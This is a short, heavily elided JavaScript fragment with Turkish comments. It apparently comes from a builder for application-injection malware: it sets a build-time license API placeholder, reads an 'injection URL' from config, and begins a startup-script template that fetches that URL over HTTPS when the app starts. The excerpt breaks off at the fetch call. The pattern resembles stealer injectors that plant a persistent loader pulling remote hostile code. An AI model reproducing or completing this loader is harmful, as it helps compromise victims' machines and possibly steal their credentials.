...
// License API ve key bilgileri - build sırasında değiştirilecek
const LICENSE_API = "%LICENSE_API_URL%";
...
// Injection URL'ini GitHub'dan al (API'den çekme - test amaçlı GitHub kullanılıyor)
const injectionUrlToUse = CONFIG.injection_url;
...
const startUpScript = `const fs = require('fs'), https = require('https');
 ...
 async function init() {
     https.get('${injectionUrlToUse}', (res) => {
